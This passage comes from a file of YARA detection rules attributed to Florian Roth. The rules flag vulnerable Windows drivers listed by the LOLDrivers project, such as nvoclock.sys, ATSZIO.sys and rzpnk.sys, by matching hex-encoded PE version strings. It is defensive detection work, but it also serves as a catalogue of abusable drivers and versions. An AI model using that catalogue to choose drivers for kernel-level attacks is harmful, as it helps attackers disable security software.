004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9002000310039003900390020002d00200032003000310034002e00200043005900520045004e00200049006e0063002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Netfiltersdkcom_Lgdcatchersys_Netfiltersdk_0C42_RID3F28 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - LgDCatcher.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:07:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e0065007400460069006c007400650072002000530044004b002000540044004900200048006f006f006b0020004400720069007600650072002000280057005000500029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0065007400460069006c00740065007200530044004b002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0034002e0039002e00380020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0035002e0038002e0039 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004c006700440043006100740063006800650072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e0065007400460069006c007400650072002000530044004b } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004c006700440043006100740063006800650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020003f0020004e0065007400460069006c00740065007200530044004b002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Supermicrocomputerinc_Superbmc_Superbmc_F843_RID3E1B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - superbmc.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:23:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]007300750070006500720062006d0063 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005300750070006500720020004d006900630072006f00200043006f006d00700075007400650072002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007300750070006500720062006d0063 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]007300750070006500720062006d0063 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007300750070006500720062006d0063002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400280063002900200031003900390033002d00320030003100350020005300750070006500720020004d006900630072006f00200043006f006d00700075007400650072002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_1023_RID464F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:13:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0031002e0033003800300030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0031002e0033003800300030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310038002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Iqvwsys_Intelriqvwsys_F877_RID3E14 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iQVW64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:21:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e00740065006c0028005200290020004e006500740077006f0072006b0020004100640061007000740065007200200044006900610067006e006f00730074006900630020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300033002e0031002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300033002e0031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e00740065006c0028005200290020006900510056005700360034002e005300590053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d003200300031003500200049006e00740065006c00200043006f00720070006f0072006100740069006f006e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_AE3A_RID4229 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:16:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560049004400490041002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056004900440049004100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00300033002e00310032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00300033002e00310032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560049004400490041002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Almicosoftware_Sfdrvxsys_Speedfan_X_AD23_RID3C45 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - sfdrvx32.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:04:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530070006500650064002000460061006e00200078003300320020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006c006d00690063006f00200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00580034002e00340033002e00300034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00580034002e00340033002e00300034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730066006400720076007800330032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00530070006500650064002000460061006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730066006400720076007800330032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200041006c006d00690063006f00200053006f00660074007700610072006500200032003000300031002d0032003000310030 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrddkprovider_Rtportsys_Windowsrddkdriver_6F80_RID41C7 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtport.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:59:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00470065006e006500720069006300200050006f0072007400200049002f004f } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200032003000300030002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00300030002e0032003100390035002e0031003600320030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00300030002e0032003100390035002e0031003600320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007200740070006f00720074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200032003000300030002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007200740070006f00720074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d006900630072006f0073006f0066007400200043006f00720070002e00200031003900380031002d0031003900390039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realtek_Rtkiowxsys_Realtekiodriver_B205_RID3C06 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkiow8x64.sys \"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:54:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200650061006c00740065006b00200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000300039002e0030003700300039002e0032003000320030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e003000300039002e0030003700300039002e0032003000320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f00770038007800360034002e0073007900730020 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005200650061006c00740065006b00200049004f00200044007200690076006500720020002000200020002000200020002000200020002000200020002000200020002000200020002000200020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f00770038007800360034002e0073007900730020 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003200300020005200650061006c00740065006b002000530065006d00690063006f006e0064007500630074006f007200200043006f00720070006f0072006100740069006f006e002e00200041006c006c002000520069006700680074002000520065007300650072007600650064002e002000200020002000200020002000200020002000200020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Filseclabcorporation_Filnk_Filseclabdynamicdefensesystem_AE55_RID44E4 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - filnk.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:12:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00460069006c007300650063006c00610062002000440079006e0061006d0069006300200044006500660065006e00730065002000530079007300740065006d0020004400720076 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00460069006c007300650063006c0061006200200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002c00200030002c00200030002c002000310039003300350033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002c00200030002c00200030002c002000310039003300350033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00660069006c006e006b } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00460069006c007300650063006c00610062002000440079006e0061006d0069006300200044006500660065006e00730065002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00660069006c006e006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d0032003000310033002000460069006c007300650063006c0061006200200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them\n}\n\nrule PUA_VULN_Driver_Sisoftware_Sandra_Sisoftwaresandra_CBF7_RID3C04 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - sandra.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:53:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530061006e00640072006100200044006500760069006300650020004400720069007600650072002000280049004100360034002900280055006e00690063006f006400650029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005300690053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310035002e00310038002e0031002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310035002e00310038002e0031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300690053006f006600740077006100720065002000530061006e006400720061 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020005300690053006f0066007400770061007200650020004c0074006400200031003900390035002d00500072006500730065006e0074002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_A475_RID4210 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:11:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e00300030002e00320030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00300030002e00320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_66F8_RID36B3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - libnicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:07:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c0020005800540043004f004d0020005300650072007600690063006500730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e0036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e0036 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006c00690062006e00690063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310031002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Dcprotectsys_Dcprotectrwinxdriver_55B5_RID457F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - DcProtect.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:38:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0044006300500072006f00740065006300740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0044006300500072006f00740065006300740020002800520029002000570069006e003700780038003600200064007200690076006500720020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310032002d00320030003200300020004a00690061006e0067006d0065006e0020004500790075006e0020004e006500740077006f0072006b00200043006f002e002c004c00740064002e00200032003000310039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Asustekcomputerinc_Atsziosys_Atsziodriver_1A4F_RID3F36 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ATSZIO.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:10:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100540053005a0049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004100530055005300540065006b00200043006f006d0070007500740065007200200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0030002e0032002e0031002e0037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0030002e0032002e0031002e0037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004100540053005a0049004f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100540053005a0049004f0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004100540053005a0049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310032 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Filseclabcorporation_Filwfp_Filseclabfirewall_490C_RID403A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - filwfp.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:53:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00460069006c007300650063006c006100620020004600690072006500770061006c006c } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00460069006c007300650063006c0061006200200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200031003200310036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200031003200310036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00660069006c007700660070 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00460069006c007300650063006c006100620020004600690072006500770061006c006c } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00660069006c007700660070002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000460069006c007300650063006c0061006200200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Asrockincorporation_Asrautochkupddrvsys_Asrautochkupddrvdriver_4AE4_RID47F9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - AsrAutoChkUpdDrv_1_0_32.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:24:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100730072004100750074006f00430068006b005500700064004400720076005f0031005f0030005f003300320020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004100530052006f0063006b00200049006e0063006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300030002e00300030002e00300030003000300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300030002e00300030002e0030003000300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004100730072004100750074006f00430068006b005500700064004400720076005f0031005f0030005f00330032002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100730072004100750074006f00430068006b005500700064004400720076005f0031005f0030005f003300320020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004100730072004100750074006f00430068006b005500700064004400720076005f0031005f0030005f00330032002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100320020004100530052006f0063006b00200049006e0063006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Razerinc_Rzpnk_Rzpnk_9E34_RID362F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rzpnk.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 16:45:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061007a006500720020004f007600650072006c0061007900200053007500700070006f00720074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520061007a00650072002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00310032002e0036003000380037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00310032002e0036003000380037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 